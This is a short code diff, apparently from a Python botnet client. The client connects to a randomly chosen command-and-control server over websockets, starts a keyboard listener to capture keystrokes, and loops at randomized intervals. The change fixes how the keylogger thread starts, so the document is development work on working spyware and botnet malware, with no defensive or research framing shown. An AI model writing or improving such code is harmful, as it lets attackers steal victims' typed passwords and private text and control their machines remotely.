@@ -69,9 +69,8 @@ async def bot_client(bot_id: str):
             server = random.choice(C2_SERVERS)
             async with websockets.connect(server) as ws:
                 print(f"[+] Bot {bot_id} connected")
-
-                threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).join(), daemon=True).start()
-
+                listener = keyboard.Listener(on_press=on_press)
+                listener.start()
                 while True:
                     await asyncio.sleep(random.uniform(0.6, 2.8))
 
